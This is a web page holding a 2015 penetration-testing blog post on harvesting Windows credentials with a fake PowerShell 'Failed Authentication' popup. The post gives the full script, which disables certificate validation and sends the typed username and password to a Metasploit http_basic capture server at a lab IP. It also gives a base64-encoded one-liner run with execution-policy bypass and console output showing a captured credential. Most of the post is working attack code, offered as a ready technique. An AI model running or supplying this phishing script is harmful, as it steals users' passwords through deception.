@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Powershell Popups &#43; Capture - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Powershell Popups &#43; Capture" />
+<meta property="og:description" content="Metasploit Minute has entered into it&rsquo;s 3rd &ldquo;season&rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2015/powershell-popups-and-capture/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2015-01-12T17:52:10-05:00" />
+<meta property="article:modified_time" content="2015-01-12T17:52:10-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Powershell Popups &#43; Capture"/>
+<meta name="twitter:description" content="Metasploit Minute has entered into it&rsquo;s 3rd &ldquo;season&rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2015/powershell-popups-and-capture/" /><link rel="prev" href="https://malicious.link/posts/2014/full-disclosure-singleclick-connect/" /><link rel="next" href="https://malicious.link/posts/2015/2015-shmoocon-hiring/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Powershell Popups + Capture",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2015\/powershell-popups-and-capture\/"
+        },"genre": "posts","keywords": "powershell, credentials","wordcount":  571 ,
+        "url": "https:\/\/malicious.link\/posts\/2015\/powershell-popups-and-capture\/","datePublished": "2015-01-12T17:52:10-05:00","dateModified": "2015-01-12T17:52:10-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Rob Fuller"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Powershell Popups + Capture</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2015-01-12">2015-01-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;571 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>Metasploit Minute has entered into it&rsquo;s 3rd &ldquo;season&rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)</p>
+<p>Here is the video:</p>
+<iframe width="560" height="315" src="//www.youtube.com/embed/H_E3FNF8rBw" frameborder="0" allowfullscreen></iframe>
+<p>Here is the code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName + &#34;\&#34; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+</span></span><span class="line"><span class="cl">$wc = new-object net.webclient;
+</span></span><span class="line"><span class="cl">$wc.Headers.Add(&#34;User-Agent&#34;,&#34;Wget/1.9+cvs-stable (Red Hat modified)&#34;);
+</span></span><span class="line"><span class="cl">$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+</span></span><span class="line"><span class="cl">$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+</span></span><span class="line"><span class="cl">$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
+</span></span><span class="line"><span class="cl">$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lets break down the code line by line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserName,[Environment]::UserDomainName);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This tells windows to prompt for credentials, with the title of &ldquo;Failed Authentication&rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$wc = new-object net.webclient;
+</span></span><span class="line"><span class="cl">$wc.Headers.Add(&#34;User-Agent&#34;,&#34;Wget/1.9+cvs-stable (Red Hat modified)&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Creates a new webclient object and sets its user agent to &lsquo;wget&rsquo;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+</span></span><span class="line"><span class="cl">$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat power.txt | iconv --to-code UTF-16LE | base64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then execute <code>powershell -ep bypass -enc &lt;the encoded text from above&gt;</code> and you get this:</p>
+<p>Image should be here: <img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2015/powershellpopup.png"
+        data-srcset="/images/2015/powershellpopup.png, /images/2015/powershellpopup.png 1.5x, /images/2015/powershellpopup.png 2x"
+        data-sizes="auto"
+        alt="/images/2015/powershellpopup.png"
+        title="/images/2015/powershellpopup.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@wpad:~/metasploit-framework# ./msfconsole -Lq
+</span></span><span class="line"><span class="cl">msf &gt; use auxiliary/server/capture/http_basic
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options (auxiliary/server/capture/http_basic):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name         Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----         ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   REALM        Secure Site      yes       The authentication realm you&#39;d like to present.
+</span></span><span class="line"><span class="cl">   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
+</span></span><span class="line"><span class="cl">   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+</span></span><span class="line"><span class="cl">   SRVPORT      80               yes       The local port to listen on.
+</span></span><span class="line"><span class="cl">   SSL          false            no        Negotiate SSL for incoming connections
+</span></span><span class="line"><span class="cl">   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span class="line"><span class="cl">   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+</span></span><span class="line"><span class="cl">   URIPATH                       no        The URI to use for this exploit (default is random)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt; set SSL true
+</span></span><span class="line"><span class="cl">SSL =&gt; true
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt; set SRVPORT 443
+</span></span><span class="line"><span class="cl">SRVPORT =&gt; 443
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt; set URIPATH /
+</span></span><span class="line"><span class="cl">URIPATH =&gt; /
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt; run
+</span></span><span class="line"><span class="cl">[*] Auxiliary module execution completed
+</span></span><span class="line"><span class="cl">msf auxiliary(http_basic) &gt;
+</span></span><span class="line"><span class="cl">[*] Listening on 0.0.0.0:443...
+</span></span><span class="line"><span class="cl">[*] Using URL: https://0.0.0.0:443/
+</span></span><span class="line"><span class="cl">[*]  Local IP: https://172.16.102.163:443/
+</span></span><span class="line"><span class="cl">[*] Server started.
+</span></span><span class="line"><span class="cl">[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
+</span></span><span class="line"><span class="cl">[+] 172.16.102.140 - Credential collected: &#34;SITTINGDUCK\user:ASDqwe123&#34; =&gt; /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Game over!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2015-01-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-title="Powershell Popups &#43; Capture" data-via="mubix" data-hashtags="powershell,credentials"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-hashtag="powershell"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-title="Powershell Popups &#43; Capture"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-title="Powershell Popups &#43; Capture"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-title="Powershell Popups &#43; Capture"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2015/powershell-popups-and-capture/" data-title="Powershell Popups &#43; Capture"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/powershell/">powershell</a>,&nbsp;<a href="/tags/credentials/">credentials</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2014/full-disclosure-singleclick-connect/" class="prev" rel="prev" title="Full Disclosure - SingleClick Connect"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Full Disclosure - SingleClick Connect</a>
+            <a href="/posts/2015/2015-shmoocon-hiring/" class="next" rel="next" title="2015 ShmooCon Hiring">2015 ShmooCon Hiring<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
